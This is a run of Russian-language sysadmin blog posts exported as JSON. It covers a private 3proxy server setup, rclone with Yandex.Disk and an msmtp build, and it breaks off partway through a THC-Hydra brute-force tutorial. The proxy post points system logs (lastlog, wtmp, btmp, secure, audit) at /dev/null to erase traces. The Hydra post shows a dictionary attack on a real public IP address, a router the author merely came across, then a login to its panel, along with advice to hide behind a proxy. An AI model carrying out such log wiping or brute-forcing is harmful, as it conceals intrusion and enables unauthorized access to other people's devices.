приобрел себе простенький vps, в качестве ОС выбрал Cent OS 7 и подцепился к нему по SSH, наблюдая девственную чистоту. Первым делом тюним SSH:\n# Первым делом меняем пароль, который мы получили в письме на новый: $ passwd # Перевешиваем SSH на порт 7788: $ sed -i -r \u0026#34;s/#Port 22/Port 7788/\u0026#34; /etc/ssh/sshd_config # Требуем вторую версию протокола и ограничиваем количество неудачных попыток входа: $ sed -i -r -e \u0026#34;s/#Protocol 2/Protocol 2/\u0026#34; -e \u0026#34;s/#MaxAuthTries 6/MaxAuthTries 1/\u0026#34; /etc/ssh/sshd_config # При необходимости отключаем selinux, так как в нашем случае он откровенно лишний # Перезапускаем демона: $ service sshd restart # Проверяем, изменился ли порт: $ ss -tnlp | grep ssh LISTEN 0 128 *:7788 *:* users:((\u0026#34;sshd\u0026#34;,pid=1029,fd=3)) LISTEN 0 128 :::7788 :::* users:((\u0026#34;sshd\u0026#34;,pid=1029,fd=4)) # Открываем порт 7788: $ firewall-cmd --zone=public --add-port=7788/tcp --permanent $ firewall-cmd --reload # Выходим и переподключаемся на **новый** порт $ logout Займемся отключением излишнего логирования, и чутка наведем красоту:\n$ unset HISTFILE $ echo \u0026#39;unset HISTFILE\u0026#39; \u0026gt;\u0026gt; /etc/bashrc # Ставим нано и выставляем его как редактор по умолчанию $ yum -y install nano $ echo \u0026#39;export VISUAL=nano\u0026#39; \u0026gt;\u0026gt; /etc/bashrc $ echo \u0026#39;export EDITOR=nano\u0026#39; \u0026gt;\u0026gt; /etc/bashrc # Опционально: # $ service rsyslog stop \u0026amp;\u0026amp; systemctl disable syslog # $ service auditd stop \u0026amp;\u0026amp; systemctl disable auditd $ unlink /var/log/lastlog \u0026amp;\u0026amp; ln -s /dev/null /var/log/lastlog $ unlink /var/log/audit/audit.log \u0026amp;\u0026amp; ln -s /dev/null /var/log/audit/audit.log $ unlink /var/log/secure \u0026amp;\u0026amp; ln -s /dev/null /var/log/secure $ unlink /var/log/wtmp \u0026amp;\u0026amp; ln -s /dev/null /var/log/wtmp $ unlink /var/log/btmp \u0026amp;\u0026amp; ln -s /dev/null /var/log/btmp $ rm -f ~/.bash_history # Красотульки $ echo \u0026#39;proxy-server\u0026#39; \u0026gt; /etc/hostname $ hostname proxy-server $ echo \u0026#39;export PS1=\u0026#34;\\[$(tput bold)\\]\\[$(tput setaf 7)\\][\\[$(tput setaf 1)\\]\\u\\[$(tput setaf 7)\\]@\\[$(tput setaf 5)\\]\\h \\[$(tput setaf 2)\\]\\w\\[$(tput setaf 7)\\]]\\\\$ \\[$(tput sgr0)\\]\u0026#34;\u0026#39; \u0026gt;\u0026gt; /etc/bashrc # Ребутим, цепляемся по новой, проверяем логи на чистоту grep -rnw \u0026#39;/var\u0026#39; -e \u0026#34;%your_real_ap_addr%\u0026#34; $ reboot Теперь поставим прокси-сервер 3proxy (aka зараза-прокси) из исходников, и настроим его:\n$ cd ~ $ yum -y install gcc $ wget https://github.com/z3APA3A/3proxy/archive/3proxy-0.8.6.tar.gz $ tar -xvzf 3proxy-*.gz $ cd 3proxy-3proxy-* $ sed -i \u0026#39;1s/^/#define ANONYMOUS 1\\n/\u0026#39; ./src/proxy.h # Делает сервер полностью анонимным $ make -f Makefile.Linux $ mkdir -p /usr/local/etc/3proxy/bin $ touch /usr/local/etc/3proxy/3proxy.pid $ cp ./src/3proxy /usr/local/etc/3proxy/bin $ cp ./scripts/rc.d/proxy.sh /etc/init.d/3proxy $ cp ./cfg/3proxy.cfg.sample /usr/local/etc/3proxy/3proxy.cfg $ ln -s /usr/local/etc/3proxy/3proxy.cfg /etc/3proxy.cfg $ chmod +x /etc/init.d/3proxy # Настраиваем: $ nano /etc/3proxy.cfg daemon pidfile /usr/local/etc/3proxy/3proxy.pid nserver 8.8.4.4 nserver 8.8.8.8 nscache 65536 timeouts 1 5 30 60 180 1800 15 60 log /dev/null auth none maxconn 64 proxy -p13231 -n -a socks -p14541 -n -a Что означает, что прокси-сервер лог принудительно не пишет; для авторизации никаких паролей не просит; proxy работает на порту 13231, socks на 14541; сервер запущен с правами root (да и насрать).\nЗапускаем его и ставим в автозагрузку:\n$ service 3proxy start $ systemctl enable 3proxy И если всё хорошо - сносим исходники 3proxy как уже не нужные:\n$ rm -Rf ~/3proxy-* Дальше - настраиваем огненную стену:\n# Открываем порт для http- и socks- прокси: $ firewall-cmd --zone=public --add-port=13231/tcp --permanent $ firewall-cmd --zone=public --add-port=14541/tcp --permanent $ firewall-cmd --reload # Блокируем ICMP трафик (echo-запросы) для того, чтоб наш сервер **не отвечал** на пинги: # Проверяем состояние: $ firewall-cmd --zone=public --query-icmp-block=echo-reply $ firewall-cmd --zone=public --query-icmp-block=echo-request # Блокируем: $ firewall-cmd --zone=public --add-icmp-block=echo-reply --permanent $ firewall-cmd --zone=public --add-icmp-block=echo-request --permanent # Перечитаем правила: $ firewall-cmd --reload # И проверим теперь: $ firewall-cmd --zone=public --query-icmp-block=echo-reply $ firewall-cmd --zone=public --query-icmp-block=echo-request И проверяем - всё должно работать. Шустренький и беспалевный прокси-сервер готов! Для проверки заходим через него, например, на 2ip.ru, и видим:\nОткуда вы: Ukraine Украина, Киев Ваш провайдер: ВестКолл Домашние сети  Лучше будет ещё добавить в крон что-то вроде:\n30 */3 * * * service 3proxy restart 0 */12 * * * reboot -f  Ну разве не профит, учитывая что физически серваки находятся в москве?\n","date":"2016-08-13T10:57:36Z","image":"https://blog.hook.sh/setup-private-proxy-server/cover_hu07b4d3c852e20c10f4c2e2e158cf3f2d_95916_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/setup-private-proxy-server/","title":"Поднимаем свой, приватный прокси-сервер"},{"content":"Сегодня мы поговорим об одном интересном, простом в обращении и в какой-то мере уникальном инструменте. Знакомьтесь: rclone. Разработчики описывают его краткой и ёмкой фразой - \u0026ldquo;rsync для облачных хранилищ\u0026rdquo;.\nОсновная функция rclone - это синхронизация данных в хранилище и на локальной машине. Утилита несомненна окажется полезной для широкого круга пользователей облачного хранилища. Её можно использовать и для резервного копирования, и в работе со статическими сайтами, и для удобного доступа к файлам на яндекс.диске (да и не только).\nУстановка Rclone может работать на различных ОС - Linux, Windows, MacOS, Solaris, FreeBSD, OpenBSD, NetBSD и Plan 9. В нашем случае мы будем рассматривать его установку на Linux-сервер (CentOS 7 x64) с простой целью - дублировать файлы бэкапов в облаке яндекс.диска. Дистрибутивы под все доступные системы можно найти на странице загрузок.\nИтак - качаем дистрибутив, распаковываем, и рассовываем файлы по директориям (работал под рутом):\n$ cd ~ $ wget http://downloads.rclone.org/rclone-current-linux-amd64.zip $ unzip ./rclone-current-linux-amd64.zip $ cd ./rclone-*-amd64/ $ cp ./rclone /usr/sbin/rclone \u0026amp;\u0026amp; chmod 755 /usr/sbin/rclone $ mkdir -p /usr/local/share/man/man1 $ cp ./rclone.1 /usr/local/share/man/man1/ $ mandb Настройка Теперь нам придется поставить клиент rclone на свой десктоп с веб-браузером (данный шаг можно совместить, если ставишь на машину с gui), так как для получения токена потребуется авторизоваться через браузер.\nВ нашем случае мы будем использовать windows-машину, для чего переходим на страницу загрузок\u0026lt; и скачал скачиваем соответствующий клиент.\nИз архива извлекаем бинарник rclone.exe и размещаем его в корне диска c:\\. После чего запускаем cmd и в консоли выполняем:\ncd /d c:\\ c:\\\u0026gt; rclone.exe config No remotes found - make a new one n) New remote s) Set configuration password q) Quit config n/s/q\u0026gt; n name\u0026gt; yandex client_id\u0026gt; # Оставляем пустым client_secret\u0026gt; # Тоже оставляем пустым Remote config Use auto config? * Say Y if not sure * Say N if you are working on a remote or headless machine y) Yes n) No y/n\u0026gt; y # Открывается окно браузера, в котором вводим логин:пароль от учетки ЯД Waiting for code... Got code -------------------- [yandex] client_id = client_secret = token = {\u0026#34;access_token\u0026#34;:\u0026#34;AQA...OuQ\u0026#34;,\u0026#34;token_type\u0026#34;:\u0026#34;bearer\u0026#34;,\u0026#34;expiry\u0026#34;:\u0026#34;2017-0..02+00:00\u0026#34;} -------------------- y) Yes this is OK e) Edit this remote d) Delete this remote y/e/d\u0026gt; y Current remotes: Name Type ==== ==== yandex yandex e) Edit existing remote n) New remote d) Delete remote s) Set configuration password q) Quit config e/n/d/s/q\u0026gt; q c:\\\u0026gt; rclone.exe --help # Смотрим строку --config string Config file. (default \u0026#34;C:\\\\Users\\\\USERNAME/.rclone.conf\u0026#34;) c:\\\u0026gt; type C:\\Users\\USERNAME\\.rclone.conf [yandex] type = yandex client_id = client_secret = token = {\u0026#34;access_token\u0026#34;:\u0026#34;AQA...OuQ\u0026#34;,\u0026#34;token_type\u0026#34;:\u0026#34;bearer\u0026#34;,\u0026#34;expiry\u0026#34;:\u0026#34;2017-0..02+00:00\u0026#34;} Теперь нужно этот конфиг (что был выведен крайней командой) перенести на наш сервер, для чего его нежно копируем в буфер обмена, и возвращаемся к терминалу:\n$ rclone --help 2\u0026gt;\u0026amp;1 | grep -e \u0026#39;--config\u0026#39; --config string Config file. (default \u0026#34;/root/.rclone.conf\u0026#34;) # создаем конфиг по указанному пути и вставляем в него содержимое конфига с десктопа: $ nano /root/.rclone.conf Проверка Остается только проверить работу rclone путем создания на яндекс.диске директории средствами терминала, и синхронизации её с локальной директорией, где у нас хранятся бэкапы (в нашем примере это директория /var/backups):\n# Проверяем $ rclone lsd yandex: # Создаем директорию для бэкапов, например $ rclone mkdir yandex:backups # И заливаем в неё (синхронизируем содержимое локального каталога с директорией в облаке): $ rclone sync /var/backups yandex:backups Теперь проверяем наличие файлов через веб-морду диска, и опционально ставим крайнюю команду в крон.\n","date":"2016-07-13T17:24:26Z","image":"https://blog.hook.sh/rclone-work-with-yandex-disk/cover_hu008cf66a99114a919f30e1ebc174804c_100692_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/rclone-work-with-yandex-disk/","title":"Дружим rclone с Яндекс.Диском"},{"content":"msmtp - это простой консольный клиент для отправки сообщений электронной почты по протоколу SMTP.\nМожно, конечно, пойти сложным путем и поставить полноценный почтовый сервер, но зачем? Нам ведь требуется просто позволить скриптам и демонам отправлять почту, а заморачиваться с DKIM, SPF, заголовками и прочим - крайне лень. Поэтому мы будем отправлять почту с помощью почтового ящика на yandex.ru, и поможет нам в этом приложение под названием msmtp.\n Важное замечание - в моем случае домен уже делегирован на яндекс, в DNS имеются все необходимые записи, почтовый ящик создан на странице pdd.yandex.ru, к нему прописаны алиасы вида no-reply, noreply, donotreply, do-not-reply для того, что бы была возможность иметь почтовый ящик с именем info@domail.ru, но успешно отправлять письма от имени, например, no-reply@domail.ru.\n Единственное \u0026ldquo;но\u0026rdquo; - в репозиториях находится старая и бажная версия. Самый критичный для нас баг - это неизменяемое поле Sender, т.е. мы не можем указать имя (или адрес? не помню) отправителя. Смотрим что есть в репозиториях:\n$ yum info msmtp # ... Name : msmtp Version : 1.4.32 Release : 1.el7 Size : 120 k # ... Смотрим информацию о релизах на официальном сайте - на момент написания этих строк это версия 1.6.5 (уже без описанного выше бага).\n Все манипуляции производились на \u0026ldquo;чистой\u0026rdquo; системе CentOS 7.2.\n Скачаем исходники и соберем приложение ручками.\n$ cd ~ $ yum install git $ git clone git://git.code.sf.net/p/msmtp/code msmtp $ cd msmtp Ставим все необходимые для сборки пакеты:\n$ yum install automake gcc gettext-devel gnutls-devel openssl-devel texinfo Запускаем autoreconf:\n$ autoreconf -i autoreconf: configure.ac: AM_GNU_GETTEXT is used, but not AM_GNU_GETTEXT_VERSION configure.ac:31: installing \u0026#39;build-aux/config.guess\u0026#39; configure.ac:31: installing \u0026#39;build-aux/config.sub\u0026#39; configure.ac:34: installing \u0026#39;build-aux/install-sh\u0026#39; configure.ac:34: installing \u0026#39;build-aux/missing\u0026#39; Makefile.am: installing \u0026#39;./INSTALL\u0026#39; doc/Makefile.am:3: installing \u0026#39;build-aux/mdate-sh\u0026#39; src/Makefile.am: installing \u0026#39;build-aux/depcomp\u0026#39; Конфигуряем:\n$ ./configure # ... Install prefix ......... : /usr/local TLS/SSL support ........ : yes (Library: GnuTLS) # \u0026lt;-- ВАЖНО GNU SASL support ....... : no IDN support ............ : no NLS support ............ : yes Libsecret support (GNOME): no MacOS X Keychain support : no И если предыдущая операция завершилась успешно (наличие поддержки TLS/SSL для нас критично), то собираем:\n$ make  Если во время сборки вылезла ошибка вида:\n *** error: gettext infrastructure mismatch: using a Makefile.in.in from gettext version 0.19 but the autoconf macros are from gettext version 0.18 make[2]: *** [stamp-po] Error 1 make[2]: Leaving directory `/root/msmtp/po\u0026#39; make[1]: *** [all-recursive] Error 1 make[1]: Leaving directory `/root/msmtp\u0026#39; make: *** [all] Error 2  То правим один файл:\n $ nano ./po/Makefile.in.in  Где заменяем строку GETTEXT_MACRO_VERSION = 0.19 на GETTEXT_MACRO_VERSION = 0.18. После этого повторяем:\n $ make Выполняем установку только при успешной сборке (отсутствии каких-либо ошибок):\n$ make install Проверяем:\n$ /usr/local/bin/msmtp --version msmtp version 1.6.5 Platform: x86_64-unknown-linux-gnu TLS/SSL library: GnuTLS # \u0026lt;-- ВАЖНО Authentication library: built-in Supported authentication methods: plain external cram-md5 login IDN support: disabled NLS: enabled, LOCALEDIR is /usr/local/share/locale Keyring support: none System configuration file name: /usr/local/etc/msmtprc User configuration file name: /root/.msmtprc Copyright (C) 2016 Martin Lambers and others. This is free software. You may redistribute copies of it under the terms of the GNU General Public License \u0026lt;http: //www.gnu.org/licenses/gpl.html\u0026gt;. There is NO WARRANTY, to the extent permitted by law.\u0026lt;/http:\u0026gt; Создаем симлинки и заменяем \u0026ldquo;стандартный\u0026rdquo; sendmail (убедись предварительно что он удален/не установлен):\n$ ln -s /usr/local/bin/msmtp /etc/alternatives/mta $ ln -s /usr/local/bin/msmtp /usr/bin/msmtp $ ln -s /etc/alternatives/mta /usr/lib/mail $ ln -s /etc/alternatives/mta /usr/bin/mail $ ln -s /etc/alternatives/mta /usr/sbin/mail $ ln -s /etc/alternatives/mta /usr/lib/sendmail $ ln -s /etc/alternatives/mta /usr/bin/sendmail $ ln -s /etc/alternatives/mta /usr/sbin/sendmail Создаем системный конфиг и симлинк на него в /etc:\n$ touch /usr/local/etc/msmtprc $ ln -s /usr/local/etc/msmtprc /etc/msmtprc Выставляем права на файл и меняем группу файла для того, чтобы php-fpm (и другие члены этой группы) смогли читать его:\n$ chmod 640 /usr/local/etc/msmtprc $ chown :www-data /usr/local/etc/msmtprc После этого переходим непосредственно к настройке:\n$ nano /etc/msmtprc defaults tls on auth on tls_starttls on tls_certcheck off logfile /var/log/msmtp.log timeout 20 account yandex host smtp.yandex.ru port 587 maildomain your_domain_name.ru from no-reply@your_domain_name.ru keepbcc on user your_mailbox_name@your_domain_name.ru password MAILBOX_PASSWORD account default : yandex И проверяем работу запуская как из консоли, так и из php-скрипта:\n$ echo -e \u0026#34;\\nSome test 1\u0026#34; | msmtp -d your_another_email@gmail.com $ php -r \u0026#34;mail(\u0026#39;your_another_email@gmail.com\u0026#39;,\u0026#39;Subject\u0026#39;,\u0026#39;Some test 2\u0026#39;);\u0026#34; Письма должны успешно приходить на your_another_email@gmail.com. Так же стоит проверить работу непосредственно из-под php-fpm, например, таким скриптом:\n\u0026lt;?php set_time_limit(15); error_reporting(E_ALL); ini_set(\u0026#39;display_errors\u0026#39;, 1); $result = mail(\u0026#39;your_another_email@gmail.com\u0026#39;, \u0026#39;Subject\u0026#39;, \u0026#39;Some test 3\u0026#39;); echo \u0026#39;\u0026lt;pre\u0026gt;\u0026#39;; var_dump($result); echo \u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;; if ($result) { echo \u0026#39;все путем\u0026#39;; } else { echo \u0026#39;что-то не так\u0026#39;; } И обратившись к нему из web. Если необходимо позволить какому-либо локальному пользователю так же из консоли отправлять письма, то необходимо создать новую группу, и добавить в неё необходимых пользователей, не забыв так же добавить в неё и php-fpm.\nНесколько почтовых ящиков и nginx Так как на одном сервере могут располагаться несколько сайтов - наверняка возникнет потребность отправлять письма с разных сайтов от разных отправителей. Поясню - на одном сервере расположены сайты с доменными именами site1.ru и site2.ru. Соответственно, отправитель в исходящих письмах с сайта site1.ru должен быть вида robot@site1.ru, а в исходящих письмах с сайта site2.ru - вида robot@site2.ru. Для того что бы этого добиться нам необходимо прописать требуемые аккаунты в файле настроек msmtp:\ndefaults tls on auth on tls_starttls on tls_certcheck off logfile /var/log/msmtp.log timeout 20 account site1 host smtp.yandex.ru port 587 maildomain site1.ru from robot@site1.ru user robot@site1.ru password password_here account site2 host smtp.yandex.ru port 587 maildomain site2.ru from robot@site2.ru user robot@site2.ru password password_here account default : site1 Теперь по умолчанию письма будут уходить от имени аккаунта site1, так как он у нас указан как аккаунт по умолчанию. Для того что бы сообщить скриптам на сайте site2.ru использовать аккаунт site2 необходимо добавить следующую строку в конфигурацию сервера site2.ru nginx:\nlocation ~ \\.php$ { # ...  fastcgi_param PHP_VALUE \u0026#34;sendmail_path = /usr/sbin/sendmail -t -i -a site2\u0026#34;; # ...  } И после этого всё начнет работать так как надо.\n","date":"2016-06-28T22:24:10Z","image":"https://blog.hook.sh/compile-and-config-msmtp/cover_hub577c79af8463c924351e5a1445741f0_93501_120x120_fill_q75_box_smart1.jpg","permalink":"https://blog.hook.sh/compile-and-config-msmtp/","title":"Собираем и настраиваем msmtp"},{"content":" Статья носит носит строго познавательный характер, за применение кем либо описанных в статье методик автор ответственности не несет.\n В тот момент, когда пинтест заходит в тупик - одним из крайних аргументов в тесте на проникновение является подбор паролей. Сервисы, к которым можно применить данный метод атаки - самые различные. А как следствие - различны и протоколы, и форматы обращений. Надо бы как то унифицировать инструменты для решения этой задачи - не хорошо под каждый новый случай писать новый брутер своими ручками.\nИ такой инструмент уже имеет место быть. Быстрый, сочный, достойный внимания - THC-Hydra. Версия 7.5 (из репозитория epel) поддерживает подбор по/для: asterisk cisco cisco-enable cvs firebird ftp ftps http[s]-{head|get} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres rdp rexec rlogin rsh sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp. Примеры эксплуатации мы рассмотрим чуть ниже, а пока - посмотрим как можно заполучить данный инструмент в свой арсенал.\nУстановка Пользователям CentOS будет достаточно подключить репозиторий epel и выполнить:\n# yum install -y epel-release $ yum install -y hydra Или для сборки из сорсов (актуально для linux, *bsd, solaris и т.д., а так же MacOS и мобильных системах, базирующихся на Linux):\n$ mkdir ~/hydra_src \u0026amp;\u0026amp; cd ~/hydra_src $ wget https://github.com/vanhauser-thc/thc-hydra/archive/master.zip \u0026amp;\u0026amp; unzip master.zip \u0026amp;\u0026amp; rm -f master.zip $ cd thc-hydra-master/ $ yum install gcc mysql-devel libssh # Для Debian - libmysqld-dev и libssh-dev $ make clean \u0026amp;\u0026amp; ./configure $ make \u0026amp;\u0026amp; make install $ ./hydra -h Hydra v8.2-dev 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-SOuvVd46] [service://server[:PORT][/OPT]] Options: -R restore a previous aborted/crashed session -S perform an SSL connect -s PORT if the service is on a different default port, define it here -l LOGIN or -L FILE login with LOGIN name, or load several logins from FILE -p PASS or -P FILE try password PASS, or load several passwords from FILE -x MIN:MAX:CHARSET password bruteforce generation, type \u0026#34;-x -h\u0026#34; to get help -e nsr try \u0026#34;n\u0026#34; null password, \u0026#34;s\u0026#34; login as pass and/or \u0026#34;r\u0026#34; reversed login -u loop around users, not passwords (effective! implied with -x) -C FILE colon separated \u0026#34;login:pass\u0026#34; format, instead of -L/-P options -M FILE list of servers to attack, one entry per line, \u0026#39;:\u0026#39; to specify port -o FILE write found login/password pairs to FILE instead of stdout -f / -F exit when a login/pass pair is found (-M: -f per host, -F global) -t TASKS run TASKS number of connects in parallel (per host, default: 16) -w / -W TIME waittime for responses (32s) / between connects per thread -4 / -6 use IPv4 (default) / IPv6 addresses (put always in [] also in -M) -v / -V / -d verbose mode / show login+pass for each attempt / debug mode -O use old SSL v2 and v3 -q do not print messages about connection errors -U service module usage details server the target: DNS, IP or 192.168.0.0/24 (this OR the -M option) service the service to crack (see below for supported protocols) OPT some service modules support additional input (-U for module help) Examples: hydra -l user -P passlist.txt ftp://192.168.0.1 hydra -L userlist.txt -p defaultpw imap://192.168.0.1/PLAIN hydra -C defaults.txt -6 pop3s://[2001:db8::1]:143/TLS:DIGEST-MD5 hydra -l admin -p password ftp://[192.168.0.0/24]/ hydra -L logins.txt -P pws.txt -M targets.txt ssh  По умолчанию бинарники гидры будут в директории /usr/local/bin/, ежели что пропиши этот путь в ~/.bash_profile, дописав его в переменной PATH.\n  При сборке из сорсов мы разумеется получаем самую свежую и сочную версию. В репах как правило лежит уже несколько устаревшая.\n И ещё более простой вариант - использовать дистрибутив Kali Linux - там уже всё есть.\nСловари Брутить можно как с помощью подбора посимвольно, так и с помощью подготовленного словаря наиболее часто используемых паролей. Таки рекомендую первым делом попытаться подобрать пароль со словарем, и уже если и этот способ не увенчался успехом - переходить к прямому бруту посмивольно.\nГде взять словари? Например, можно пошариться на этой странице или глянуть сразу здесь - имена архивов более чем говорящие. От себя лишь скажу, что использую в основном 3 словаря:\n Очень маленький и очень популярный (топ первые 500 паролей) Второй побольше - на 5000 паролей Третий от Cain \u0026amp; Abel на ~300000 паролей  И в таком же порядке их применяю во время теста. Второй словарь - это слитые воедино несколько других не менее популярных списков (отсортированный с удалением дубликатов и комментариев) который можно получить, например, так:\n$ cat twitter-banned.txt 500-worst-passwords.txt lower john.txt password | grep -v \u0026#39;^#\u0026#39; | sort -u \u0026gt; all_small_dic.txt В качестве бонуса можешь забрать готовые списки паролей (top500; top4000; cain\u0026amp;abel (300k); пароли от яндекса (700k); пароли от маил.ру (2740k); маил.ру + яндекс (3300k)):\n passwords_list.zip  В общем, считаем что словари у тебя готовы к применению. Как пользоваться гидрой?\nЯ есть Грут Брут Какие настройки и возможности предоставляет нам гидра? Давай рассмотрим флаги запуска по порядку:\n   Флаг Описание     -R Восстановить предыдущую сессию, которая по какой-либо причине была прервана   -S Использовать SSL соединение   -s PORT Указание порта (отличного от дефолтного) сервиса   -l LOGIN Использовать указанный логин для попытки аутентификации   -L FILE Использовать список логинов из указанного файла   -p PASS Использовать указанный пароль для попытки аутентификации   -P FILE Использовать список паролей из указанного файла   -x Генерировать пароли для подбора самостоятельно, указывается в формате -x MIN:MAX:CHARSET, где MIN - это минимальная длинна пароля, MAX - соответственно, максимальная, а CHARSET - это набор символов, в котором a означает латиницу в нижнем регистре, A - в верхнем регистре, 1 - числа, а для указания дополнительных символов - просто укажи их как есть. Вот несколько примеров генерации паролей: -x 3:5:a - длинной от 3 до 5 символов, состоящие только из символов латиницы в нижнем регистре; -x 5:8:A1 - длинной от 5 до 8 символов, состоящие из символов латиницы в верхнем регистре + цифр; -x 1:3:/ - длинной от 1 до 3 символов, состоящие только из символов слеша /; -x 5:5:/%,.- - длинной в 5 символов, состоящие только из символов /%,.-   -e nsr Укажи n для проверки пустых паролей, s для попытки использования в качестве пароля - логин, и (или) r для попытки входа под перевернутым логином   -u Пытаться подобрать логин а не пароль   -C FILE Использовать файл в формате login:pass вместо указания -L/-P   -M FILE Файл со списком целей для брутфорса (можно с указанием порта через двоеточие), по одному на строку   -o FILE Записать подобранную пару логин/пароль в файл, вместо того чтоб просто вывести в stdout (будет указан с указанием сервера, к которому подобран - не запутаешься)   -f / -F Прекратить работу, как только первая пара логин:пароль будет подобрана. -f только для текущего хоста,-F - глобально   -t TASKS Количество параллельных процессов (читай - потоков). По умолчанию 16   -w Таймаут для ответа сервера. По умолчанию 32 секунды   -W Таймаут между ответами сервера   -4 / -6 Использовать IPv4 (по умолчанию) или IPv6 адреса (при указании с -M всегда заключай в [])   -v Более подробный вывод информации о процессе   -V Выводить каждый подбираемый логин + пароль   -d Режим дебага   -O Использовать старый SSL v2 и v3   -q Не выводить сообщения об ошибках подключения   -U Дополнительная информация о использовании выбранного модуля   -h Вывод справочной информации    Гидра - фас! Теперь давай рассмотрим пример работы на определенных целях. Все IP - вымышленные, соответствие с реальными - чистейшей воды совпадение ;)\n Ахтунг! Юзай proxy/socks/vpn для безопасности собственной задницы. Так, сугубо на всякий случай\n Basic Authentication Например, сканируя диапазон адресов мы натыкаемся на некоторый интерфейс, доступный по http протоколу, но закрытый для доступа при помощи Basic Authentication (пример настройки с помощью nginx):\n screen \nИ у нас стоит задача вспомнить наш же забытый пароль ;) Давай определимся с тем, какие данные у нас есть:\n IP сервера 192.168.1.2 Сервис http Путь, который закрыт для нас запросом пары логин:пароль /private/ Порт, на котором работает http сервер 80 (стандартный)  Предположим (или любым доступным путем выясним), что логин используется admin, и нам неизвестен лишь пароль. Подбирать будем с помощью заранее подготовленного словаря и с использованием модуля http-get:\n$ hydra -l admin -P ~/pass_lists/dedik_passes.txt -o ./hydra_result.log -f -V -s 80 192.168.1.2 http-get /private/ Hydra v8.1 (c) 2014 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes. Hydra (http://www.thc.org/thc-hydra) starting at 2015-08-12 13:01:25 [DATA] max 16 tasks per 1 server, overall 64 tasks, 488 login tries (l:1/p:488), ~0 tries per task [DATA] attacking service http-get on port 80 [ATTEMPT] target 192.168.1.2 - login \u0026#34;admin\u0026#34; - pass \u0026#34;!\u0026#34; - 1 of 488 [child 0] [ATTEMPT] target 192.168.1.2 - login \u0026#34;admin\u0026#34; - pass \u0026#34;!!!\u0026#34; - 2 of 488 [child 1] [ATTEMPT] target 192.168.1.2 - login \u0026#34;admin\u0026#34; - pass \u0026#34;!!!!\u0026#34; - 3 of 488 [child 2] ... [ATTEMPT] target 192.168.1.2 - login \u0026#34;admin\u0026#34; - pass \u0026#34;administrat0r\u0026#34; - 250 of 488 [child 0] [ATTEMPT] target 192.168.1.2 - login \u0026#34;admin\u0026#34; - pass \u0026#34;administrator\u0026#34; - 251 of 488 [child 2] [ATTEMPT] target 192.168.1.2 - login \u0026#34;admin\u0026#34; - pass \u0026#34;administrator1\u0026#34; - 252 of 488 [child 13] [80][http-get] host: 192.168.1.2 login: admin password: admin # ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ [STATUS] attack finished for 192.168.1.2 (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (http://www.thc.org/thc-hydra) finished at 2015-08-12 13:01:26 $ cat ./hydra_result.log # Hydra v8.1 run at 2015-08-12 13:01:25 on 192.168.1.2 http-get (hydra -l admin -P /root/pass_lists/dedik_passes.txt -o ./hydra_result.log -f -V -s 80 192.168.1.2 http-get /private/) [80][http-get] host: 192.168.1.2 login: admin password: admin # ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ Пабам - и через 1 секунду стандартный пароль admin успешно сбручен!\nFTP Другой пример - случайно находим в сети роутер MikroTik, да с открытыми наружу портами 80 (http) и 21 (ftp). Решаем сообщить его владельцу о наличии данной неприятности, но для этого нужно сперва получить доступ к этому самому микротику.\nБрутить вебморду микротика можно, но проходит это значительно медленнее, чем например брутить ftp. А мы знаем, что стандартный логин на микротиках admin, и используется один пароль ко всем сервисам. Получив пароль для ftp - получим доступ ко всему остальному:\n screenshot \nИсходные данные:\n IP сервера 178.72.83.246 Сервис ftp Стандартный логин admin Порт, на котором работает ftp сервер 21 (стандартный)  Запускаем гидру:\n$ hydra -l admin -P ~/pass_lists/all_small_dic.txt -o ./hydra_result.log -f -V -s 21 178.72.83.246 ftp И наблюдаем процесс подбора (~900 паролей в минуту):\n[DATA] max 16 tasks per 1 server, overall 64 tasks, 4106 login tries (l:1/p:4106), ~4 tries per task [DATA] attacking service ftp on port 21 [ATTEMPT] target 178.72.83.246 - login \u0026#34;admin\u0026#34; - pass \u0026#34;\u0026#34; - 1 of 4106 [child 0] [ATTEMPT] target 178.72.83.246 - login \u0026#34;admin\u0026#34; - pass \u0026#34;!@#$%\u0026#34; - 2 of 4106 [child 1] [ATTEMPT] target 178.72.83.246 - login \u0026#34;admin\u0026#34; - pass \u0026#34;!@#$%^\u0026#34; - 3 of 4106 [child 2] [ATTEMPT] target 178.72.83.246 - login \u0026#34;admin\u0026#34; - pass \u0026#34;!@#$%^\u0026amp;\u0026#34; - 4 of 4106 [child 3] ... [ATTEMPT] target 178.72.83.246 - login \u0026#34;admin\u0026#34; - pass \u0026#34;adminadmin\u0026#34; - 249 of 488 [child 5] [ATTEMPT] target 178.72.83.246 - login \u0026#34;admin\u0026#34; - pass \u0026#34;administrat0r\u0026#34; - 250 of 488 [child 0] [ATTEMPT] target 178.72.83.246 - login \u0026#34;admin\u0026#34; - pass \u0026#34;administrator\u0026#34; - 251 of 488 [child 14] [21][ftp] host: 178.72.83.246 login: admin password: adminadmin # ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ [STATUS] attack finished for 178.72.83.246 (valid pair found) 1 of 1 target successfully completed, 1 valid password found Hydra (http://www.thc.org/thc-hydra) finished at 2015-08-12 13:46:51 Спустя каких то 30 секунд ещё один словарный пароль adminadmin был успешно подобран. После этого успешно логинимся в веб-панель:\n screenshot \nВыясняем контакты администратора, сообщаем ему о наличии уязвимости, и больше ничего не делаем ;)\nВеб - авторизация Например - мы забыли пароль к роутеру, который использует веб-авторизацию. Т.е. не просто \u0026ldquo;выплывающее окошко браузера\u0026rdquo;, а полноценные поля для ввода пары логин:пароль. Давай попытаемся подобрать 